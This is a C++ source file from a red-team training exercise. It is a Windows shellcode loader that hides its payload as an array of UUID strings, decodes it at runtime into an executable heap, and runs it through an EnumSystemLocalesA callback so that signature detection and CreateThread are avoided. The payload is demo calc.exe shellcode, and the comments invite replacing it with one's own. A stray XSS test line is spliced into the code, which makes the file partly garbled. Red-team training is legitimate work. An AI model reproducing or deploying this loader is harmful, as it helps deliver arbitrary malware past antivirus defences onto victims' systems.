/*
 * Red Team Exercises #60 - Shellcode Hiding with UUID Strings
 * Author: Joas Antonio dos Santos
 * Repository: https://github.com/CyberSecurityUP/Red-Team-Exercises
 * Courses: https://courses.redteamleaders.com/
 *
 * Description:
 *   Converts shellcode bytes into UUID string format and reconstructs
 *   at runtime using UuidFromStringA(). Evades static signature detection
 *   by disguising shellcode as an array of GUIDs.
 *
 * Compile: x86_64-w64-mingw32-g++ -o uuid_runner.exe uuid_shellcode_runner.cpp -lrpcrt4 -lntdll
 * Or MSVC: cl /EHsc uuid_shellcode_runner.cpp rpcrt4.lib
 */

#include <windows.h>
#include <rpc.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "rpcrt4.lib")

// ---------------------------------------------------------------
// STEP 1: Generate your UUIDs with the Python helper script:
//   python3 shellcode_to_uuid.py -i payload.bin
//
// Replace this array with your generated UUIDs.
// Below is a DEMO calc.exe shellcode encoded as UUIDs (x64 Windows)
// ---------------------------------------------------------------

const char* shellcode_uuids[] = {
    "e48348fc-e8f0-00c0-0000-415141505251",
    "d2314856-4865-528b-6048-8b5218488b52",
    "728b4820-4850-b70f-4a4a-4d31c94831c0",
    "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
    "48514152-528b-8b20-423c-4801d08b8088",
    "48000000-c085-6774-4801-d0508b481844",
    "4920408b-d001-56e3-48ff-c9418b348848",
    "314dd601-48c9-c031-ac41-c1c90d4101c1",
    "f175e038-034c-244c-0845-39d175d85844",
    "4924408b-d001-4166-8b0c-48448b401c49",
    "8b41d001-0488-4148-d001-415841585e59",
    "59415a41-5841-4159-5a48-83ec20415249",
    "594dc3e8-5a48-8949-c1e5-7fff48bbf0b5",
    "a2564dff-48ff-89d4-c1ba-4fde1863ffff",
    "bae0d568-a4b8-0056-ffff-d563616c632e",
    "00657865-0000-0000-0000-000000000000"
};

## <script>alert(1)</script>

int num_uuids = sizeof(shellcode_uuids) / sizeof(shellcode_uuids[0]);

// ---------------------------------------------------------------
// STEP 2: Decode UUIDs back to shellcode bytes at runtime
// ---------------------------------------------------------------

BOOL DecodeUUIDsToMemory(LPVOID baseAddress) {
    BYTE* dest = (BYTE*)baseAddress;

    for (int i = 0; i < num_uuids; i++) {
        RPC_CSTR rpcStr = (RPC_CSTR)shellcode_uuids[i];
        RPC_STATUS status = UuidFromStringA(rpcStr, (UUID*)dest);

        if (status != RPC_S_OK) {
            printf("[-] UuidFromStringA failed at index %d, error: %ld\n", i, status);
            return FALSE;
        }
        dest += 16; // Each UUID = 16 bytes
    }

    printf("[+] Decoded %d UUIDs (%d bytes) into memory at 0x%p\n",
           num_uuids, num_uuids * 16, baseAddress);
    return TRUE;
}

// ---------------------------------------------------------------
// STEP 3: Execute via EnumSystemLocalesA callback (avoids CreateThread)
// ---------------------------------------------------------------

int main() {
    printf("[*] Red Team Exercises #60 - UUID Shellcode Runner\n");
    printf("[*] Allocating memory for shellcode...\n");

    // Allocate with HeapAlloc first (less suspicious than VirtualAlloc)
    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    if (!hHeap) {
        printf("[-] HeapCreate failed: %lu\n", GetLastError());
        return 1;
    }

    SIZE_T shellcodeSize = num_uuids * 16;
    LPVOID execMem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, shellcodeSize);
    if (!execMem) {
        printf("[-] HeapAlloc failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Executable heap allocated at: 0x%p\n", execMem);

    // Decode UUIDs into the executable heap
    if (!DecodeUUIDsToMemory(execMem)) {
        printf("[-] UUID decoding failed\n");
        return 1;
    }

    printf("[*] Executing shellcode via EnumSystemLocalesA callback...\n");

    // EnumSystemLocalesA takes a callback function pointer
    // The callback signature matches what we need for shellcode execution
    EnumSystemLocalesA((LOCALE_ENUMPROCA)execMem, 0);

    // Cleanup (may not reach here depending on shellcode behavior)
    HeapFree(hHeap, 0, execMem);
    HeapDestroy(hHeap);

    return 0;
}
